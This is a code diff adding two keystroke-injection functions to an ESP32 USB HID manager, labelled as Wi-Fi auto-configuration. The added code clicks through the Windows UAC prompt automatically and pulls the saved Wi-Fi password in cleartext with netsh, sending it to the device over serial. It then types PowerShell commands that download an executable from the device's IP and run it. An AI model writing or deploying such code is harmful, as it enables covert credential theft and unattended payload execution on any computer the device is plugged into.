@@ -311,3 +311,116 @@ bool HIDManager::pressMediaKey(const String& mediaKey) {
     lastError = "";
     return true;
 }
+
+// ==================== Auto WiFi Configuration ====================
+
+void HIDManager::autoGetWindowsWiFi() {
+    Serial.println("[HID] Starting Windows WiFi auto-config...");
+    delay(2000); // Wait for USB device to be recognized
+    
+    // 1. Win+R to open Run dialog
+    keyboard.press(KEY_LEFT_GUI);
+    keyboard.press('r');
+    delay(100);
+    keyboard.releaseAll();
+    delay(500);
+    
+    // 2. Type "powershell" and run as administrator (Ctrl+Shift+Enter)
+    keyboard.print("powershell");
+    delay(200);
+    keyboard.press(KEY_LEFT_CTRL);
+    keyboard.press(KEY_LEFT_SHIFT);
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    
+    // 3. Wait for UAC prompt and auto-confirm with Alt+Y
+    Serial.println("[HID] Waiting for UAC prompt...");
+    delay(1500); // Critical delay for UAC
+    keyboard.press(KEY_LEFT_ALT);
+    keyboard.press('y');
+    delay(100);
+    keyboard.releaseAll();
+    delay(1000); // Wait for PowerShell to open
+    
+    Serial.println("[HID] PowerShell opened, executing WiFi script...");
+    
+    // 4. Get WiFi SSID
+    keyboard.print("$wifi = (netsh wlan show interfaces | Select-String 'SSID' | Select-Object -First 1) -replace '.*: ', '';");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(200);
+    
+    // 5. Get WiFi password
+    keyboard.print("$pass = (netsh wlan show profile name=$wifi key=clear | Select-String 'Key Content') -replace '.*: ', '';");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(200);
+    
+    // 6. Find ESP32 CDC serial port
+    keyboard.print("$port = (Get-WmiObject Win32_SerialPort | Where-Object {$_.Description -like '*USB*'} | Select-Object -First 1).DeviceID;");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(200);
+    
+    // 7. Send WiFi info to serial port (format: SSID|Password)
+    keyboard.print("if ($port) { $sp = New-Object System.IO.Ports.SerialPort $port, 115200; $sp.Open(); $sp.WriteLine(\"$wifi|$pass\"); $sp.Close(); }");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(500);
+    
+    // 8. Exit PowerShell to close the window
+    keyboard.print("exit");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    
+    Serial.println("[HID] WiFi script execution complete, window will close");
+}
+
+void HIDManager::downloadAndRunAgent(const String& deviceIP) {
+    Serial.printf("[HID] Starting agent download from %s...\n", deviceIP.c_str());
+    delay(1000);
+    
+    // 1. Open new PowerShell window (Win+R)
+    keyboard.press(KEY_LEFT_GUI);
+    keyboard.press('r');
+    delay(100);
+    keyboard.releaseAll();
+    delay(500);
+    
+    keyboard.print("powershell");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(1000); // Wait for PowerShell to open
+    
+    // 2. Download agent from ESP32
+    String downloadCmd = "Invoke-WebRequest -Uri 'http://" + deviceIP + "/api/agent/download?platform=windows' -OutFile $env:TEMP\\noox-agent.exe";
+    Serial.println("[HID] Executing download command...");
+    keyboard.print(downloadCmd);
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(3000); // Wait for download to complete
+    
+    // 3. Run agent program (no WiFi parameter needed, already connected)
+    Serial.println("[HID] Running agent program...");
+    keyboard.print("& $env:TEMP\\noox-agent.exe");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    delay(1000); // Wait for agent to start
+    
+    // 4. Exit PowerShell to close the window
+    keyboard.print("exit");
+    keyboard.press(KEY_RETURN);
+    delay(100);
+    keyboard.releaseAll();
+    
+    Serial.println("[HID] Agent execution started, window will close");
+}
